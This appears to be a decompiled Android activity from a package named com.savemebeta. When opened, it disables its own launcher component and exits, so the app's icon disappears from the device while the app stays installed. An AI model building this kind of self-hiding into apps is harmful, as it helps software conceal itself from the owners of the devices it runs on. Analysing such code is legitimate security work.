package com.savemebeta;

import android.app.Activity;
import android.os.Bundle;

public class pack extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
        finish();
    }
}
